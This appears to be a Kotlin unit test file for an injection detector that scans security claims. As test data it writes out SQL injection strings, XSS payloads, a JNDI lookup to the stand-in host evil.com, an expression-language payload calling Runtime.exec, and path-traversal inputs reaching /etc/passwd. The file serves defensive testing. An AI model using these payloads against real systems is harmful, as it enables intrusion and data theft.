package com.axians.eaf.framework.security

import com.axians.eaf.framework.core.common.exceptions.EafException
import io.kotest.assertions.throwables.shouldNotThrowAny
import io.kotest.assertions.throwables.shouldThrow
import io.kotest.core.spec.style.FunSpec
import io.kotest.matchers.string.shouldContain
import io.kotest.matchers.types.shouldBeInstanceOf

class InjectionDetectorTest :
    FunSpec({

        val detector = InjectionDetector()

        context("SQL Injection Patterns") {
            test("should detect SQL injection with --") {
                val claims = mapOf("username" to "admin' --")
                val exception = shouldThrow<InjectionDetectedException> { detector.scan(claims) }
                exception.claim shouldContain "username"
                exception.detectedPattern shouldContain "--"
            }

            test("should detect SQL injection with ;") {
                val claims = mapOf("username" to "admin'; DROP TABLE users;")
                val exception = shouldThrow<InjectionDetectedException> { detector.scan(claims) }
                exception.claim shouldContain "username"
                exception.detectedPattern shouldContain ";"
            }

            test("should detect SQL injection with UNION SELECT") {
                val claims = mapOf("username" to "admin' UNION SELECT null, null, password FROM users--")
                val exception = shouldThrow<InjectionDetectedException> { detector.scan(claims) }
                exception.claim shouldContain "username"
                exception.detectedPattern shouldContain "union|select"
            }

            test("should not flag legitimate text like O'Malley") {
                val claims = mapOf("name" to "O'Malley")
                shouldNotThrowAny { detector.scan(claims) }
            }
        }

        context("XSS Patterns") {
            test("should detect XSS with <script>") {
                val claims = mapOf("comment" to "<script>alert(1)</script>")
                val exception = shouldThrow<InjectionDetectedException> { detector.scan(claims) }
                exception.claim shouldContain "comment"
                exception.detectedPattern shouldContain "<script"
            }

            test("should detect XSS with javascript:") {
                val claims = mapOf("url" to "javascript:alert(1)")
                val exception = shouldThrow<InjectionDetectedException> { detector.scan(claims) }
                exception.claim shouldContain "url"
                exception.detectedPattern shouldContain "javascript:"
            }
        }

        context("JNDI Injection Patterns") {
            test("should detect JNDI injection with jndi:") {
                val claims = mapOf("data" to "\${jndi:ldap://evil.com/a}")
                val exception = shouldThrow<InjectionDetectedException> { detector.scan(claims) }
                exception.claim shouldContain "data"
                exception.detectedPattern shouldContain "jndi:"
            }
        }

        context("Expression Language injection with \${...}") {
            test("should detect Expression Language injection with \${...}") {
                val claims = mapOf("message" to "Hello \${T(java.lang.Runtime).getRuntime().exec('calc')}")
                val exception = shouldThrow<InjectionDetectedException> { detector.scan(claims) }
                exception.claim shouldContain "message"
                exception.detectedPattern shouldContain "\\u0024\{.*}"
            }
        }

        context("Path Traversal Patterns") {
            test("should detect Path Traversal with ../") {
                val claims = mapOf("path" to "../../etc/passwd")
                val exception = shouldThrow<InjectionDetectedException> { detector.scan(claims) }
                exception.claim shouldContain "path"
                exception.detectedPattern shouldContain "\\.\\..\\\\/"
            }

            test("should detect Path Traversal with ..\\") {
                val claims = mapOf("path" to "..\\..\\windows\\win.ini")
                val exception = shouldThrow<InjectionDetectedException> { detector.scan(claims) }
                exception.claim shouldContain "path"
                exception.detectedPattern shouldContain "\\.\\..\\\\/"
            }
        }

        context("Safe Claim Values") {
            test("should not flag safe strings") {
                val claims =
                    mapOf(
                        "username" to "john.doe",
                        "email" to "john.doe@example.com",
                        "description" to "This is a normal description.",
                    )
                shouldNotThrowAny { detector.scan(claims) }
            }

            test("should handle non-string claims gracefully") {
                val claims =
                    mapOf(
                        "userId" to 123,
                        "isAdmin" to true,
                    )
                shouldNotThrowAny { detector.scan(claims) }
            }
        }

        context("InjectionDetectedException") {
            test("should extend EafException") {
                val exception = InjectionDetectedException("claim", "pattern", "value")
                exception.shouldBeInstanceOf<EafException>()
            }
        }
    })
